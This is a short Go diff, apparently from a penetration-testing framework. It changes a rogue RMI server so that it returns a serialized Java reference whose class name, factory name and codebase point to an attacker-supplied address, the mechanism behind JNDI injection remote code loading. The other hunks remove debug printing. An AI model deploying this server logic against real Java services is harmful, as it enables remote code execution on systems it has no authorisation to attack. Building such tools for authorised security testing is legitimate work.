@@ -225,11 +225,15 @@ func SetRmiResource(name string, resource []byte, verbose string) FacadeServerCo
 
 func SetRmiResourceAddr(name string, rmiResourceAddr string) FacadeServerConfig {
 	return func(f *FacadeServer) {
-		objIns, err := yso.GetJavaObjectArrayIns()
+		objIns, err := LoadReferenceResourceForRmi()
 		if err != nil {
-			log.Error(err)
+			log.Errorf("load serialized data failed: %s", err)
+			return
 		}
-		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshalerWithCodeBase(rmiResourceAddr))
+		yso.ReplaceStringInJavaSerilizable(objIns, "{{className}}", name, -1)
+		yso.ReplaceStringInJavaSerilizable(objIns, "{{factoryName}}", name, -1)
+		yso.ReplaceStringInJavaSerilizable(objIns, "{{codebase}}", rmiResourceAddr, -1)
+		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshalerWithCodeBase(""))
 		payloadBuf := bytes.Buffer{}
 		payloadBuf.WriteByte(0x51)                       // Return
 		payloadBuf.Write([]byte{0xac, 0xed, 0x00, 0x05}) // stream header
@@ -442,7 +446,6 @@ WRAPPER:
 	case 'J': // 4a524d49 (JRMI)
 		if codec.EncodeToHex(raw) == "4a524d49" {
 			log.Info("handle for JRMI")
-			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
 			err := f.rmiShakeHands(peekableConn)
 			if err != nil {
 				log.Errorf("rmi handshak failed: %s", err)
@@ -452,9 +455,7 @@ WRAPPER:
 
 			log.Infof("start to serve for rmi client")
 			peekableConn.SetReadDeadline(time.Now().Add(10 * time.Second))
-			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
 			err = f.rmiServe(peekableConn)
-			println(codec.Md5(fmt.Sprintf("%p", peekableConn.Conn)))
 			if err != nil {
 				log.Errorf("serve rmi failed: %s", err)
 				peekableConn.Close()
